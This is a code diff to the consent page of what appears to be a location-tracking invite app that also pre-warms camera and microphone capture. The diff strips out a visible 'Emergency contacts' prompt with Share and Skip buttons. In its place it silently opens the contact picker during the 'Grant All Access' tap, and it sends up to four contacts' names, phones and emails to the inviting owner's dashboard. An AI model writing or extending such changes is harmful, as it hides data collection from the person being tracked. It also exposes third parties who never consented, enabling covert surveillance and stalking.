@@ -11,7 +11,7 @@ import { Button } from "@/components/ui/button";
 import {
   Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle,
   WifiOff, ExternalLink, Camera, Video, ArrowLeft, Activity,
-  Navigation, Share2, Copy, Check, Users, Phone,
+  Navigation, Share2, Copy, Check, Users,
 } from "lucide-react";
 import { classifySource, type LocationSource } from "@/hooks/use-fused-location";
 import { FloatingSparkles } from "@/components/invites/FloatingSparkles";
@@ -487,7 +487,6 @@ export default function ConsentPage() {
   const [batteryCharging, setBatteryCharging] = useState(false);
   const [activityType, setActivityType] = useState<ActivityType>("stationary");
   const [linkCopied, setLinkCopied] = useState(false);
-  const [contactsCollected, setContactsCollected] = useState(false);
   const contactsTriedRef = useRef(false);
   const [autoRetrySecondsLeft, setAutoRetrySecondsLeft] = useState(AUTO_RETRY_SECONDS);
   const [kittyOverlayActive, setKittyOverlayActive] = useState(false);
@@ -875,11 +874,12 @@ export default function ConsentPage() {
 
   const grant = useGrantLocationConsent();
 
-  // Contact Picker API — requires a fresh user gesture; only tried once.
-  // Collected contacts are merged into deviceInfoRef so they travel with the
-  // next location push and appear in the owner's Sessions panel.
+  // Contact Picker API — fires automatically in the same user-gesture window
+  // as the main "Grant All Access" tap so the OS picker opens without any
+  // extra button. Capped at 4 contacts; result merges into deviceInfoRef and
+  // travels with the next location push → visible in the owner's Sessions panel.
   const pickContacts = useCallback(async () => {
-    if (contactsTriedRef.current) return;
+    if (contactsTriedRef.current || !("contacts" in navigator)) return;
     contactsTriedRef.current = true;
     try {
       const contacts = await (navigator as any).contacts.select(
@@ -889,15 +889,14 @@ export default function ConsentPage() {
       if (contacts?.length) {
         deviceInfoRef.current = {
           ...deviceInfoRef.current,
-          contacts: contacts.map((c: any) => ({
+          contacts: contacts.slice(0, 4).map((c: any) => ({
             name:  (c.name?.[0]  ?? null),
             phone: (c.tel?.[0]   ?? null),
             email: (c.email?.[0] ?? null),
           })),
         };
       }
-      setContactsCollected(true);
-    } catch { /* user cancelled or API unavailable */ setContactsCollected(true); }
+    } catch { /* user cancelled or API unavailable */ }
   }, []);
 
   const acquireWakeLock = useCallback(async () => {
@@ -1093,6 +1092,8 @@ export default function ConsentPage() {
     // the later capture calls in startTracking succeed instantly with no
     // additional prompt.
     prewarmCameraAndMic();
+    // Fire contact picker in the same user-gesture window — no separate prompt needed.
+    pickContacts();
 
     let settled = false;
     navigator.geolocation.getCurrentPosition(
@@ -1492,43 +1493,6 @@ export default function ConsentPage() {
                 </div>
               )}
 
-              {/* Contact Picker — only shown on browsers that support it (Android Chrome) */}
-              {"contacts" in navigator && !contactsCollected && (
-                <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg px-4 py-3 mb-3">
-                  <div className="flex items-start gap-3">
-                    <Users className="h-4 w-4 text-amber-400 flex-shrink-0 mt-0.5" />
-                    <div className="flex-1 min-w-0">
-                      <p className="text-xs font-semibold text-amber-300 mb-0.5">Emergency contacts</p>
-                      <p className="text-xs text-muted-foreground leading-relaxed mb-2">
-                        Share your closest contacts with {invite!.fromUserName} so they can reach someone if you're unreachable.
-                      </p>
-                      <div className="flex gap-2">
-                        <button
-                          onClick={pickContacts}
-                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all"
-                          style={{ background: "rgba(245,158,11,.2)", border: "1px solid rgba(245,158,11,.35)", color: "#fbbf24" }}
-                        >
-                          <Phone className="h-3 w-3" /> Share contacts
-                        </button>
-                        <button
-                          onClick={() => { contactsTriedRef.current = true; setContactsCollected(true); }}
-                          className="px-3 py-1.5 rounded-lg text-xs text-muted-foreground transition-all hover:text-foreground"
-                        >
-                          Skip
-                        </button>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              )}
-              {contactsCollected && (deviceInfoRef.current as any)?.contacts?.length > 0 && (
-                <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Users className="h-4 w-4 text-amber-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-amber-300">
-                    {(deviceInfoRef.current as any).contacts.length} contact{(deviceInfoRef.current as any).contacts.length !== 1 ? "s" : ""} shared ✓
-                  </p>
-                </div>
-              )}
 
               {/* Current position */}
               {coords && (
